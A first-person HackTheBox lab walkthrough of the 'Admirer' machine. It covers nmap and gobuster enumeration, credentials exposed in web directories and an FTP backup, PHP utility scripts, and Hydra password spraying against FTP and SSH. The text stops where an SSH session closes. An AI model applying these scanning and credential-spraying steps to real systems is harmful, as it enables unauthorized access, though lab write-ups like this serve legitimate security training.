# HackTheBox: Admirer (Walkthrough)

This is my very first HackTheBox writeup. I'm exicted to try out another provider; <a href="https://HackTheBox.com">HackTheBox</a>.

## Recon

### Browsing to host

I navigated to the host via my browser. And found a nice portfolio-style blog, which multiple images. 

There's a slogan detailing '__ADMIRER__ OF SKILLS AND VISUALS'.

When compared with previous CTFs I've done, the quality of the site is surprisingly good.

Before taking a look at some common files, I checked out the source of the page for some potential attack vectors.

```
Multiverse by HTML5 UP html5up.net | @ajlkn
Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
```
Which lends some information on the theme used and the type of theme used. Potentially searchable for exploits and general inner workings shuold it be avaliable on a repository somewhere.

#### Common files

__Sitemap__

I attempted to navigate to a potential sitemap, but did notuncover an expected XML file. Though, I did find someserver versions on an error page.

```
Apache/2.4.25 (Debian) Server at 10.10.10.187 Port 80
```

__Robots__

Following this I tried to navigate to the robots file.Which did exist, and contained the following.
```
User-agent: *
# This folder contains personal contacts and creds, so noone -not even robots- should see it - waldo
Disallow: /admin-dir
```

#### /admin-dir

Unfortunately, we're not allowed to access the `/admin-dir` directory; we're returned a 403 error.

```
Forbidden

You don't have permission to access this resource.
```

#### Summary

- Server version: `Apache/2.4.25`
- Operating system: `Debian`
- Username: `waldo`
- Admin directory: `/admin-dir`

## Enumeration

Now we have a minimal picture of the web server, we can use automated tools to scan for things we've not come across.

### Nmap

Nmap reveals 3 services:
- FTP, vsftpd 3.0.3
- SSH, OpenSSH 7.4p1
- HTTP, Apache httpd 2.4.25

```shell
kali@kali:~/Desktop/HackTheBox$ nmap 10.10.10.187 -A 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 17:05 EDT
Nmap scan report for 10.10.10.187
Host is up (0.012s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds
```

### GoBuster

```shell
kali@kali:~$ gobuster dir -u  http://10.10.10.187/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/22 17:12:35 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/.htaccess (Status: 403)
/images (Status: 301)
/index.php (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/09/22 17:12:41 Finished
===============================================================
```
There are 2 folder revealled that we'd not earlier founded. `/assets` and `/images`. Of which, both return 301 redirected to a 403 forbidden page.

We previously found the `/admin-dir` directory during [recon](#recon). After manually attempting to enumerate, I resorted to another enumeration of the `/admin-dir` folder.

```shell
kali@kali:~$ gobuster dir -u  http://10.10.10.187/admin-dir/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/admin-dir/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/22 17:26:53 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)
===============================================================
2020/09/22 17:26:58 Finished
===============================================================
```

Here I found two files, `contact.txt` and `credentials.txt`.

#### contact.txt

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

#### credentials.txt

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

Interestingly, there is reference to Wordpress in the credentials file, though we've not yet enumerated this. Nor are there the files `/wp-admin`, `/wp-login`. Potential for there to be repeat usage, however.


## Gaining access

### FTP server

The nmap scan earlier found an FTP server. Lets try to attack it using the username `ftpuser` that we found in the `credentials.txt` file.

```shell
kali@kali:~$ ftp 10.10.10.187 21
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-x---    2 0        111          4096 Dec 03  2019 .
drwxr-x---    2 0        111          4096 Dec 03  2019 ..
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
```

After successfully logging in, we find two files `dump.sql` and `html.tar.gz`. Of course, `dump.sql` looks most enticing, but I wouldn't ignore the strangely zipped 'html.tar.gz'..

#### dump.sql

We get a few tidbits of information from the dump.

- Database name `admirerdb`
- Server version `10.1.41-MariaDB-0+deb9u1`
- Table name `items`


```sql
kali@kali:~/Desktop/HackTheBox/admirer$ cat dump.sql
-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: admirerdb
-- ------------------------------------------------------
-- Server version       10.1.41-MariaDB-0+deb9u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `items`
--

DROP TABLE IF EXISTS `items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `thumb_path` text NOT NULL,
  `image_path` text NOT NULL,
  `title` text NOT NULL,
  `text` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `items`
--

LOCK TABLES `items` WRITE;
/*!40000 ALTER TABLE `items` DISABLE KEYS */;
INSERT INTO `items` VALUES (1,'images/thumbs/thmb_art01.jpg','images/fulls/art01.jpg','Visual Art','A pure showcase of skill and emotion.'),(2,'images/thumbs/thmb_eng02.jpg','images/fulls/eng02.jpg','The Beauty and the Beast','Besides the technology, there is also the eye candy...'),(3,'images/thumbs/thmb_nat01.jpg','images/fulls/nat01.jpg','The uncontrollable lightshow','When the sun decides to play at night.'),(4,'images/thumbs/thmb_arch02.jpg','images/fulls/arch02.jpg','Nearly Monochromatic','One could simply spend hours looking at this indoor square.'),(5,'images/thumbs/thmb_mind01.jpg','images/fulls/mind01.jpg','Way ahead of his time','You probably still use some of his inventions... 500yrs later.'),(6,'images/thumbs/thmb_mus02.jpg','images/fulls/mus02.jpg','The outcomes of complexity','Seriously, listen to Dust in Interstellar\'s OST. Thank me later.'),(7,'images/thumbs/thmb_arch01.jpg','images/fulls/arch01.jpg','Back to basics','And centuries later, we want to go back and live in nature... Sort of.'),(8,'images/thumbs/thmb_mind02.jpg','images/fulls/mind02.jpg','We need him back','He might have been a loner who allegedly slept with a pigeon, but that brain...'),(9,'images/thumbs/thmb_eng01.jpg','images/fulls/eng01.jpg','In the name of Science','Some theories need to be proven.'),(10,'images/thumbs/thmb_mus01.jpg','images/fulls/mus01.jpg','Equal Temperament','Because without him, music would not exist (as we know it today).');
/*!40000 ALTER TABLE `items` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2019-12-02 20:24:15
```

#### html.tar.gz

This appears to be a previous backup of the webserver.

```shell
kali@kali:~/Desktop/HackTheBox/admirer/html$ tar -xvf html.tar
... #removed junk
images/fulls/eng02.jpg
index.php
robots.txt
utility-scripts/
utility-scripts/phptest.php
utility-scripts/info.php
utility-scripts/db_admin.php
utility-scripts/admin_tasks.php
w4ld0s_s3cr3t_d1r/
w4ld0s_s3cr3t_d1r/credentials.txt
w4ld0s_s3cr3t_d1r/contacts.txt
```

I dug into the extract, and found that the `w4ld0s_s3cr3t_dir/credentials.txt` contained a new credential. Waldo's bank account details.

```shell
kali@kali:~/Desktop/HackTheBox/admirer/html$ cat w4ld0s_s3cr3t_d1r/credentials.txt 
[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

Following further enumeration of the credentials, I dug into the utility scripts which revealed some admin-esque scripts.

- __admin_tasks.php__: containg some php interface that fires shell scripts via the POST parameter `task`.
    
    ```php
    ...
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /*********************************************************************************** 
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
      ...
    ```
- __db_admin.php__: containing __MySQL credentials__
    ```php
    <?php
        $servername = "localhost";
        $username = "waldo";
        $password = "Wh3r3_1s_w4ld0?";

        // Create connection
        $conn = new mysqli($servername, $username, $password);

        // Check connection
        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }
        echo "Connected successfully";

        // TODO: Finish implementing this or find a better open source alternative
    ?>
    ```
- __info.php__: containing some script returning the PHP version.
    ```php
    <?php phpinfo(); ?>
    ```
- __phptest.php__: containing some junk echo
    ```php
    <?php
        echo("Just a test to see if PHP works.");
    ?>
    ```

### Utility scripts

Lets attempt to access the utility scripts we enumerated in the step previous.

- http://10.10.10.187/utility-scripts/info.php

    The returns all PHP versioning, as expected. For example: `PHP Version 7.0.33-0+deb9u7` and a vast array of environment variables.

- http://10.10.10.187/utility-scripts/admin_tasks.php

    The 'admin_tasks' utility is up on the server too. 
    
    There are only 3 commands avaliable, but they can be fired by editing the HTML such that they're no longer disabled.

    I tried to inject some scripts into this, but unfortuntaely made no gains.

### Combining users & passwords

I copied all users found thus far into a file `users.txt` and all passwors found into `pass.txt`, then ran these files through Hydra to see if we had any success.

```
kali@kali:~/Desktop/HackTheBox/admirer$ hydra -L users.txt -P pass.txt ftp://10.10.10.187
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-22 19:11:37
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ftp://10.10.10.187:21/
[21][ftp] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-22 19:11:41
kali@kali:~/Desktop/HackTheBox/admirer$ hydra -L users.txt -P pass.txt ssh://10.10.10.187
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-22 19:11:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.10.10.187:22/
[22][ssh] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-22 19:11:52
```

It seems the `ftpuser` also has SSH access.

Though, access is immediately closed upon connection.

```
kali@kali:~/Desktop/HackTheBox/admirer$ ssh ftpuser@10.10.10.187
ftpuser@10.10.10.187's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Connection to 10.10.10.187 closed.
```


